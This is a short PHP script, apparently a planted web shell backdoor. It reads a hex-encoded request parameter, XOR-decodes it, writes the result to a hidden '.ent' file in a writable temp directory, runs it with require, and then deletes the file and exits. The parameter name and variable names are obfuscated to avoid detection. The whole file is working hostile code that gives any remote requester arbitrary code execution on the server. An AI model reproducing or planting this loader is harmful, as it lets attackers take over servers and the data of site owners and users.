<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["\x68ld"])){
	$comp = hex2bin($_REQUEST["\x68ld"]);
	$fac    =      ''   ;   for($k=0; $k<strlen($comp); $k++){$fac .= chr(ord($comp[$k]) ^ 94);}
	$pset = array_filter([session_save_path(), "/var/tmp", getenv("TMP"), getcwd(), getenv("TEMP"), "/dev/shm", "/tmp", sys_get_temp_dir(), ini_get("upload_tmp_dir")]);
	$binding = 0;
do {
    $factor = $pset[$binding] ?? null;
    if ($binding >= count($pset)) break;
    		if (max(0, is_dir($factor) * is_writable($factor))) {
    $ptr = join("/", [$factor, ".ent"]);
    if (file_put_contents($ptr, $fac)) {
	require $ptr;
	unlink($ptr);
	die();
}
}
    $binding++;
} while (true);
}